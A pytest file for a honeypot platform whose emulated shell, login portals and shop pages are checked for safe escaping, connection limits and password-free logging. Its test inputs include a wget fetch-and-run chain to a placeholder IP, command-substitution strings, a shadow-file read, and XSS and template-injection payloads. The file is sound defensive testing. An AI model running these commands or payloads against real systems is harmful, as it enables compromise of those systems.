"""Emulators are reusable templates: every instance is defined only by validated configuration."""
import asyncio
import json
from uuid import uuid4
import httpx
from shared.buffer import DurableBuffer
from shared.catalog import PLUGINS
from shared.contracts import ProfileSpec
from honeypots.service import Supervisor
from test_agent import free_port


def running_config(spec, generation=1):
    return {'assigned': True, 'honeypot_id': str(uuid4()), 'profile_version': 1, 'generation': generation,
            'desired_state': 'running', 'spec': spec.model_dump()}


async def test_several_instances_of_one_emulator_run_side_by_side(tmp_path):
    started = []
    try:
        for number in range(3):
            queue = DurableBuffer(str(tmp_path/f'tcp-{number}.db'))
            spec = ProfileSpec(name='Shared profile', port=free_port(), banner=f'Laboratory TCP Service {number}',
                               max_input_bytes=32 if number == 0 else 0)
            config = running_config(spec)
            queue.set('configuration', config)
            supervisor = Supervisor(queue, 'tcp', bind_address='127.0.0.1')
            await supervisor.tick()
            started.append((supervisor, queue, spec, config))
        for number, (supervisor, queue, spec, config) in enumerate(started):
            reader, writer = await asyncio.open_connection('127.0.0.1', spec.port)
            assert (await reader.readline()).decode().strip() == f'Laboratory TCP Service {number}'
            writer.write(b'HELLO \x00\x07 lab client with a rather long line of input')
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        await asyncio.sleep(.1)
        for number, (supervisor, queue, spec, config) in enumerate(started):
            events = queue.batch()
            assert {e['honeypot_id'] for e in events} == {config['honeypot_id']}
            assert {e['destination_port'] for e in events} == {spec.port}
            kinds = [e['event_type'] for e in events]
            assert kinds == (['connection', 'data_received'] if number == 0 else ['connection'])
        received = started[0][1].batch()[1]['payload']
        assert received['bytes_received'] == 32 and received['input_preview'] == 'HELLO .. lab client with a rathe'
    finally:
        for supervisor, *_ in started:
            await supervisor.stop()


async def test_connection_limit_and_timeout_are_enforced(tmp_path):
    queue = DurableBuffer(str(tmp_path/'events.db'))
    spec = ProfileSpec(name='Limited', port=free_port(), max_connections=1, connection_timeout=1, max_input_bytes=16)
    supervisor = Supervisor(queue, 'tcp', bind_address='127.0.0.1')
    try:
        await supervisor.apply(running_config(spec))
        reader, writer = await asyncio.open_connection('127.0.0.1', spec.port)
        assert b'SSH' in await reader.readline()
        second_reader, second_writer = await asyncio.open_connection('127.0.0.1', spec.port)
        assert await second_reader.read() == b''
        second_writer.close()
        assert await asyncio.wait_for(reader.read(), 3) == b''
        writer.close()
        assert [e['event_type'] for e in queue.batch()] == ['connection']
        assert queue.get('capture_error') is None
    finally:
        await supervisor.stop()


async def test_declarative_site_routes_pages_and_sessions(tmp_path):
    queue = DurableBuffer(str(tmp_path/'events.db'))
    hostile = '{{7*7}} ${x} <script>alert(1)</script>'
    defaults = PLUGINS['http-admin'].default_spec()
    defaults['pages']['login']['components'].append({'type': 'paragraph', 'text': hostile})
    spec = ProfileSpec.model_validate(defaults | {
        'port': free_port(), 'identity': 'Портал <b>Лаборатории</b>', 'authentication_mode': 'configured-accounts',
        'decoy_accounts': ['demo_admin'], 'session_timeout': 600})
    supervisor = Supervisor(queue, 'http', bind_address='127.0.0.1')
    try:
        await supervisor.apply(running_config(spec))
        async with httpx.AsyncClient(base_url=f'http://127.0.0.1:{spec.port}') as client:
            home = await client.get('/')
            assert 'Портал &lt;b&gt;Лаборатории&lt;/b&gt;' in home.text and '<b>' not in home.text
            assert '{{7*7}} ${x} &lt;script&gt;' in home.text and '<script>' not in home.text
            assert "default-src 'none'" in home.headers['content-security-policy']
            assert 'Max-Age=600' in home.headers['set-cookie']
            assert (await client.get('/static/site.css')).headers['content-type'].startswith('text/css')
            assert (await client.get('/admin')).status_code == 200
            assert (await client.get('/missing')).status_code == 404
            closed = await client.get('/dashboard')
            assert closed.status_code == 302 and closed.headers['location'] == '/'
            assert 'отклонён' in (await client.post('/login', data={'username': 'guest', 'password': 'p4ss'})).text
            assert (await client.get('/dashboard')).status_code == 302
            assert 'Имитируемый сеанс создан' in (await client.post('/login', data={'username': 'demo_admin', 'password': 'p4ss'})).text
            dashboard = await client.get('/dashboard')
            assert dashboard.status_code == 200 and 'Вымышленные узлы' in dashboard.text
        events = queue.batch()
        attempts = [e['payload']['result'] for e in events if e['event_type'] == 'authentication_attempt']
        assert attempts == ['simulated_failure', 'simulated_success']
        statuses = [(e['payload']['path'], e['payload']['status']) for e in events if e['event_type'] == 'http_request']
        assert ('/missing', 404) in statuses and ('/dashboard', 302) in statuses and ('/dashboard', 200) in statuses
        assert [e['payload']['path'] for e in events if e['event_type'] == 'navigation'] == ['/admin', '/dashboard']
        assert 'p4ss' not in json.dumps(events)
    finally:
        await supervisor.stop()


async def test_json_api_service_and_per_route_logging(tmp_path):
    queue = DurableBuffer(str(tmp_path/'events.db'))
    defaults = PLUGINS['http-api'].default_spec()
    defaults['routes'].append({'path': '/health', 'method': 'GET', 'response': 'json', 'json_body': {'ok': True},
                               'status': 503, 'log': False})
    spec = ProfileSpec.model_validate(defaults | {'port': free_port()})
    supervisor = Supervisor(queue, 'http', bind_address='127.0.0.1')
    try:
        await supervisor.apply(running_config(spec))
        async with httpx.AsyncClient(base_url=f'http://127.0.0.1:{spec.port}') as client:
            root = await client.get('/')
            assert root.headers['content-type'] == 'application/json' and root.json()['synthetic'] is True
            assert (await client.get('/api/v1/users')).status_code == 401
            login = await client.post('/api/v1/login', json={'username': 'synthetic', 'password': 'never-stored'})
            assert login.json() == {'authenticated': True, 'synthetic': True}
            assert (await client.get('/api/v1/users')).json() == {'users': 0, 'synthetic': True}
            quiet = await client.get('/health')
            assert quiet.status_code == 503 and quiet.json() == {'ok': True}
        events = queue.batch()
        assert 'never-stored' not in json.dumps(events)
        assert '/health' not in [e['payload'].get('path') for e in events]
        assert [e['payload']['username'] for e in events if e['event_type'] == 'authentication_attempt'] == ['synthetic']
        assert not [e for e in events if e['event_type'] == 'navigation']
    finally:
        await supervisor.stop()


async def test_disabled_telemetry_records_nothing_but_service_keeps_answering(tmp_path):
    queue = DurableBuffer(str(tmp_path/'events.db'))
    spec = ProfileSpec(name='Silent', port=free_port(), telemetry_enabled=False)
    supervisor = Supervisor(queue, 'tcp', bind_address='127.0.0.1')
    try:
        await supervisor.apply(running_config(spec))
        reader, writer = await asyncio.open_connection('127.0.0.1', spec.port)
        assert b'SSH' in await reader.readline()
        writer.close()
        await writer.wait_closed()
        assert queue.size() == 0
    finally:
        await supervisor.stop()



async def shell_instance(tmp_path, **settings):
    from test_agent import free_port as port
    queue = DurableBuffer(str(tmp_path / 'shell.db'))
    spec = ProfileSpec.model_validate(PLUGINS['telnet-shell'].default_spec('Shell') | {'port': port()} | settings)
    queue.set('configuration', running_config(spec))
    supervisor = Supervisor(queue, 'tcp', bind_address='127.0.0.1')
    await supervisor.tick()
    return queue, spec


async def dialogue(port, lines, pause=0.05):
    reader, writer = await asyncio.open_connection('127.0.0.1', port)
    received = b''
    try:
        for line in lines:
            await asyncio.sleep(pause)
            writer.write(line)
            await writer.drain()
        while chunk := await asyncio.wait_for(reader.read(4096), 2):
            received += chunk
    except (asyncio.TimeoutError, ConnectionError):
        with __import__('contextlib').suppress(ConnectionError, asyncio.TimeoutError):
            while chunk := await asyncio.wait_for(reader.read(4096), 0.5):
                received += chunk
    writer.close()
    return received


def test_shell_answers_from_tables_and_never_runs_anything(tmp_path, monkeypatch):
    import subprocess, os
    from honeypots.shell import Shell, severity
    monkeypatch.setattr(subprocess, 'Popen', lambda *a, **k: (_ for _ in ()).throw(AssertionError('process started')))
    monkeypatch.setattr(os, 'system', lambda *a, **k: (_ for _ in ()).throw(AssertionError('process started')))
    shell = Shell('edge-07', 'root')
    assert shell.prompt() == 'root@edge-07:~# '
    assert shell.run('whoami; id')[0] == 'root\nuid=0(root) gid=0(root) groups=0(root)\n'
    assert 'Linux edge-07 5.15.0' in shell.run('uname -a')[0] and shell.run('cat /etc/hostname')[0] == 'edge-07\n'
    assert shell.run('cd /etc && pwd')[0] == '/etc\n' and shell.prompt() == 'root@edge-07:/etc# '
    assert 'passwd' in shell.run('ls')[0] and shell.run('cat passwd')[0].startswith('root:x:0:0')
    assert shell.run('cat /etc/shadow')[0] == 'cat: /etc/shadow: No such file or directory\n'
    assert shell.run('cd /nowhere')[0].startswith('-bash: cd: /nowhere: No such file')
    assert shell.run('/bin/busybox ECCHI')[0] == 'ECCHI: applet not found\n'
    assert shell.run('wget http://203.0.113.9/x.sh -O /tmp/x; chmod +x /tmp/x; /tmp/x')[0] == \
        "wget: unable to resolve host address 'http://203.0.113.9/x.sh'\n-bash: /tmp/x: command not found\n"
    assert shell.run('cat /tmp/x')[0] == 'cat: /tmp/x: No such file or directory\n'
    assert shell.run('$(reboot) `id` | sh')[0].startswith('-bash: $(reboot): command not found')
    assert shell.run("echo 'unterminated")[0] == "'unterminated\n"
    assert shell.run('__class__')[0] == '-bash: __class__: command not found\n' and shell.run('command')[0].endswith('not found\n')
    assert len(shell.run('cat ' + ' '.join(['/proc/cpuinfo'] * 40) + ';' * 50)[0]) <= 4096
    assert shell.run('exit') == ('logout\n', True) and shell.run('uptime; exit; id')[1] is True
    operator = Shell('edge-07', 'deploy')
    assert operator.prompt() == 'deploy@edge-07:~$ ' and operator.run('pwd')[0] == '/home/deploy\n'
    assert severity('ls -la') == 'medium' and severity('cd /tmp; wget http://x/y') == 'high' and severity('./payload') == 'high'


async def test_telnet_shell_records_login_and_commands_but_never_the_password(tmp_path):
    queue, spec = await shell_instance(tmp_path)
    negotiation = bytes([255, 253, 1, 255, 253, 3, 255, 250, 31, 0, 80, 0, 24, 255, 240])
    received = await dialogue(spec.port, [negotiation + b'root\r\n', b'S3cret-Passw0rd\r\n', b'uname -a\r\n',
                                         b'cat /etc/os-release\n', b'wgte\x7f\x7fet http://203.0.113.9/bot\r\x00', b'exit\r\n'])
    text = received.decode('latin-1')
    assert received.startswith(bytes([255, 251, 1, 255, 251, 3])) and 'srv-01 login: ' in text
    assert 'Linux srv-01 5.15.0' in text and 'Ubuntu 22.04.4 LTS' in text and 'root@srv-01:~# ' in text and 'logout' in text
    assert 'S3cret' not in text
    await asyncio.sleep(.1)
    events = queue.batch()
    assert [e['event_type'] for e in events] == ['connection', 'authentication_attempt'] + ['data_received'] * 4
    assert events[1]['payload'] == {'username': 'root', 'result': 'accepted', 'summary': 'Telnet login attempt'}
    commands = [e['payload']['input_preview'] for e in events[2:]]
    assert commands == ['uname -a', 'cat /etc/os-release', 'wget http://203.0.113.9/bot', 'exit']
    assert [e['severity'] for e in events[2:]] == ['medium', 'medium', 'high', 'medium']
    assert len({e['session_id'] for e in events}) == 1 and {e['protocol'] for e in events} == {'TCP'}
    assert 'S3cret' not in json.dumps(events) and 'Passw0rd' not in json.dumps(events)


async def test_telnet_shell_enforces_accounts_and_session_limits(tmp_path):
    queue, spec = await shell_instance(tmp_path, authentication_mode='configured-accounts', decoy_accounts=['deploy'],
                                       max_commands=2, max_input_bytes=16)
    refused = await dialogue(spec.port, [b'admin\n', b'a\n', b'guest\n', b'b\n', b'root\n', b'c\n', b'id\n'])
    assert refused.count(b'Login incorrect') == 3 and b'uid=' not in refused
    opened = await dialogue(spec.port, [b'deploy\n', b'x\n', b'echo ' + b'A' * 200 + b'\n', b'id\n', b'whoami\n'])
    text = opened.decode('latin-1')
    assert 'deploy@srv-01:~$ ' in text and 'uid=1000(deploy)' in text and text.count('deploy\r\n') == 1
    await asyncio.sleep(.1)
    events = queue.batch()
    attempts = [e['payload'] for e in events if e['event_type'] == 'authentication_attempt']
    assert [(a['username'], a['result']) for a in attempts] == [('admin', 'rejected'), ('guest', 'rejected'), ('root', 'rejected'), ('deploy', 'accepted')]
    commands = [e['payload']['input_preview'] for e in events if e['event_type'] == 'data_received']
    assert commands == ['echo ' + 'A' * 11, 'id']


async def test_one_source_cannot_hold_every_connection_slot(tmp_path):
    from honeypots.service import MAX_PER_SOURCE
    queue = DurableBuffer(str(tmp_path / 'limits.db'))
    spec = ProfileSpec(name='Limits', port=free_port(), banner='SSH-2.0-OpenSSH_8.9p1', max_input_bytes=16,
                       connection_timeout=5, max_connections=64)
    supervisor = Supervisor(queue, 'tcp', bind_address='127.0.0.1')
    try:
        await supervisor.apply(running_config(spec))
        held = []
        for _ in range(MAX_PER_SOURCE):
            reader, writer = await asyncio.open_connection('127.0.0.1', spec.port)
            assert (await reader.readline()).startswith(b'SSH-2.0')
            held.append((reader, writer))
        reader, writer = await asyncio.open_connection('127.0.0.1', spec.port)
        assert await asyncio.wait_for(reader.read(), 3) == b''
        writer.close()
        held[0][1].write(b'bye\n')
        await held[0][1].drain()
        assert await asyncio.wait_for(held[0][0].read(), 3) == b''
        await asyncio.sleep(.1)
        reader, writer = await asyncio.open_connection('127.0.0.1', spec.port)
        assert (await asyncio.wait_for(reader.readline(), 3)).startswith(b'SSH-2.0')
        writer.close()
        for _, other in held[1:]:
            other.close()
        await asyncio.sleep(.1)
        assert queue.get('capture_error') is None
    finally:
        await supervisor.stop()



async def test_store_site_looks_like_a_shop_and_records_what_visitors_do(tmp_path):
    queue = DurableBuffer(str(tmp_path / 'store.db'))
    spec = ProfileSpec.model_validate(PLUGINS['http-store'].default_spec() | {'port': free_port(), 'identity': 'Нордик <Shop>'})
    supervisor = Supervisor(queue, 'http', bind_address='127.0.0.1')
    try:
        await supervisor.apply(running_config(spec))
        async with httpx.AsyncClient(base_url=f'http://127.0.0.1:{spec.port}') as client:
            home = await client.get('/')
            text = home.text
            assert "<body class='store'>" in text and "<header class='top'>" in text and '<footer>' in text
            assert 'Нордик &lt;Shop&gt;' in text and '<Shop>' not in text
            assert text.count("class='product'") == 6 and text.count('<svg') == 6 and 'Худи Basic' in text and '4 990 ₽' in text
            assert "href='/catalog'" in text and "class='hero'" in text and "class='card'" in text
            assert '<script' not in text and '<img' not in text and 'http://' not in text and 'https://' not in text
            assert "default-src 'none'" in home.headers['content-security-policy']
            for path in ('/catalog', '/sale', '/product/hoodie-basic', '/product/tee-classic', '/product/jeans-straight',
                         '/cart', '/delivery', '/contacts', '/login'):
                page = await client.get(path)
                assert page.status_code == 200 and "<header class='top'>" in page.text, path
            assert (await client.get('/catalog')).text.count("class='product'") == 12
            assert (await client.get('/product/unknown')).status_code == 404
            closed = await client.get('/account')
            assert closed.status_code == 302 and closed.headers['location'] == '/login'
            refused = await client.post('/login', data={'username': 'customer@mail.test', 'password': 'my-real-password'})
            assert 'Не удалось войти' in refused.text
            opened = await client.post('/login', data={'username': 'admin', 'password': 'whatever'})
            assert 'Личный кабинет' in opened.text and (await client.get('/account')).status_code == 200
        events = queue.batch()
        attempts = [(e['payload']['username'], e['payload']['result']) for e in events if e['event_type'] == 'authentication_attempt']
        assert attempts == [('customer@mail.test', 'simulated_failure'), ('admin', 'simulated_success')]
        assert 'my-real-password' not in json.dumps(events) and 'whatever' not in json.dumps(events)
        viewed = [e['payload']['path'] for e in events if e['event_type'] == 'navigation']
        assert '/catalog' in viewed and '/product/hoodie-basic' in viewed
        fields = {field.name for page in spec.pages.values() for block in page.components if block.type == 'form' for field in block.fields}
        assert fields == {'username', 'password'}
    finally:
        await supervisor.stop()


async def test_portal_site_and_layouts(tmp_path):
    from honeypots.rendering import render_page
    queue = DurableBuffer(str(tmp_path / 'portal.db'))
    spec = ProfileSpec.model_validate(PLUGINS['http-portal'].default_spec() | {'port': free_port()})
    supervisor = Supervisor(queue, 'http', bind_address='127.0.0.1')
    try:
        await supervisor.apply(running_config(spec))
        async with httpx.AsyncClient(base_url=f'http://127.0.0.1:{spec.port}') as client:
            home = (await client.get('/')).text
            assert "<body class='portal'>" in home and 'Портал сотрудников' in home and home.count("class='card'") == 3
            assert (await client.get('/documents')).status_code == 302
            assert 'Рабочий стол' in (await client.post('/login', data={'username': 'hr', 'password': 'x'})).text
            assert (await client.get('/documents')).status_code == 200
    finally:
        await supervisor.stop()
    values = {'{title}': 'Сайт', '{description}': '', '{account}': 'a', '{status}': ''}
    page = spec.pages['home']
    plain = render_page(page, values).decode()
    assert "<body class='plain'>" in plain and '<header' not in plain and '<footer' not in plain and "<nav><a href='/'>" in plain
    assert "<body class='plain'>" in render_page(page, values, "x' onload='alert(1)").decode()


def test_new_blocks_accept_only_known_pictures_colours_and_local_links():
    import pytest
    from pydantic import ValidationError
    from shared.contracts import Page
    good = {'type': 'products', 'items': [{'name': 'Вещь', 'price': '1 ₽', 'kind': 'bag', 'color': 'olive', 'href': '/x'}]}
    assert Page.model_validate({'title': 'T', 'components': [good]}).components[0].items[0].kind == 'bag'
    for change in ({'kind': 'gun'}, {'color': '#ff0000'}, {'href': 'https://evil.test/'}, {'href': '//evil.test'}, {'href': '/static/x'},
                   {'name': ''}, {'extra': 1}):
        with pytest.raises(ValidationError):
            Page.model_validate({'title': 'T', 'components': [{'type': 'products', 'items': [good['items'][0] | change]}]})
    with pytest.raises(ValidationError):
        Page.model_validate({'title': 'T', 'components': [{'type': 'hero', 'title': 'H', 'button_label': 'Go', 'button_href': 'javascript:alert(1)'}]})
    with pytest.raises(ValidationError):
        ProfileSpec(name='x', site_layout='shop')
    hostile = Page.model_validate({'title': 'T', 'components': [
        {'type': 'hero', 'title': '<b>x</b>', 'text': "' onmouseover='1"},
        {'type': 'products', 'items': [good['items'][0] | {'name': "A' onload='x", 'note': '<i>'}]},
        {'type': 'cards', 'items': [{'title': '<script>1</script>', 'text': '{{7*7}}'}]}]})
    from honeypots.rendering import render_page
    html = render_page(hostile, {'{title}': 'S'}, 'store').decode()
    assert '<b>' not in html and '<script>' not in html and '<i>' not in html and "onload='x" not in html and "onmouseover='1" not in html
    assert '{{7*7}}' in html
